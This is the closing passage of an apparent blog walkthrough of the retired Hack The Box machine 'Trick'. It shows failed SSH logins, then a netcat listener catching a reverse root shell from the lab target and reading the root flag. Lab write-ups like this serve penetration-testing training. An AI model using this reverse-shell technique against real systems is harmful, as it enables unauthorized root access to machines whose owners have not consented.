save and then exit and then ssh michael and trigger the shell

```
──(achilles㉿Nicholas)-[~/HTB/Labs/Trick]
└─$ ssh michael@10.10.11.166

michael@10.10.11.166's password:
Permission denied, please try again.
michael@10.10.11.166's password:
Permission denied, please try again.
michael@10.10.11.166's password:
michael@10.10.11.166: Permission denied (publickey,password).

┌──(achilles㉿Nicholas)-[~/HTB/Labs/Trick]
└─$

┌──(achilles㉿Nicholas)-[~/HTB/Labs/Trick]
└─$ ssh michael@10.10.11.166
michael@10.10.11.166's password:
Permission denied, please try again.
michael@10.10.11.166's password:
Permission denied, please try again.
michael@10.10.11.166's password:
michael@10.10.11.166: Permission denied (publickey,password).

┌──(achilles㉿Nicholas)-[~/HTB/Labs/Trick]
└─$

┌──(achilles㉿Nicholas)-[~/HTB/Labs/Trick]
└─$ ssh michael@10.10.11.166
ssh: connect to host 10.10.11.166 port 22: Connection refused

```

```
nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.166] 44230
bash: cannot set terminal process group (7892): Inappropriate ioctl for device
bash: no job control in this shell
root@trick:/# cat /root/root.txt
cat /root/root.txt
03b4f0ba1604c11d015f7XXXXXXXXXXX
root@trick:/# exit
```

End that is it as we grab and submit the final flags… hope you enjoy and if you are new to this and need further help then what i’ve shown.. check out ippsec he is by far the best at walking you through each retired machine.. he is my go to when i need help.. take care!

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [November 2, 2025](https://medium.com/p/1587e9c79bc1).

<a href="https://medium.com/@nicholasmullenski/trick-htb-machine-walkthrough-1587e9c79bc1" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
